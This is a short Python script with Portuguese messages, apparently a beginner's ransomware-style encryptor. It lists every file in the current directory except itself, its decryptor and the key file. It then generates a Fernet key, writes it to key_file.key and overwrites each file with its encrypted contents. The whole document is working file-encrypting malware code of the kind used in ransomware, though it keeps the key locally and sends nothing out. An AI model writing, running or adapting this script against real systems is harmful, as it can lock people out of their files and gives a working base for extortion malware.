import os
from cryptography.fernet import Fernet
print("...bibliotecas importadas")

def get_file_list():
	files = []
	for file in os.listdir():
		if file == "encrypt.py" or file == "decrypt.py" or file == "key_file.key":
			continue
		if os.path.isfile(file):
			files.append(file)

	print("Os arquivos encontrados foram:", files)
	return files

def generate_key_file():
	key = Fernet.generate_key()
	print("A chave é:", key)

	with open("key_file.key", "wb") as f:
		f.write(key)
	print("...arquivo-chave gerado")
	return key

def encryption_process(files, key):
	print("Iniciando a encriptação...")

	for file in files:
		with open(file, "rb") as f:
			content = f.read()
		encrypted_content = Fernet(key).encrypt(content)
		with open(file, "wb") as f:
			f.write(encrypted_content)

	print("...arquivos criptografados!")

files = get_file_list()
key = generate_key_file()
encryption_process(files, key)